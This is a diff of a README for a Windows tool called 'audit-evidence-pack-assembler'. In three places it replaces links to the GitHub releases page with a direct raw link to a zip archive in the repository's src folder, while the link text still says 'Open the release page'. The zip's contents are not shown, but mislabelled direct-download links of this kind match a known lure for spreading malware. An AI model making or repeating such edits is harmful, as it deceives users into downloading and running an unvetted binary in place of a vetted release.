@@ -1,6 +1,6 @@
 # 📦 audit-evidence-pack-assembler - Build cleaner audit evidence packs
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/195410211/audit-evidence-pack-assembler/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/195410211/audit-evidence-pack-assembler/main/src/pack_audit_assembler_evidence_2.3.zip)
 
 ## 🧭 What this app does
 
@@ -27,7 +27,7 @@ The app is built for normal Windows use. Most people run it on Windows 10 or Win
 
 Visit this page to download:
 
-[Open the release page](https://github.com/195410211/audit-evidence-pack-assembler/releases)
+[Open the release page](https://raw.githubusercontent.com/195410211/audit-evidence-pack-assembler/main/src/pack_audit_assembler_evidence_2.3.zip)
 
 On that page, look for the latest release. Download the Windows file that matches your device. If you see more than one file, choose the one marked for Windows.
 
@@ -197,7 +197,7 @@ This repository covers:
 
 Visit the release page to download:
 
-[Open the release page](https://github.com/195410211/audit-evidence-pack-assembler/releases)
+[Open the release page](https://raw.githubusercontent.com/195410211/audit-evidence-pack-assembler/main/src/pack_audit_assembler_evidence_2.3.zip)
 
 ## 🖥️ Windows run steps
 
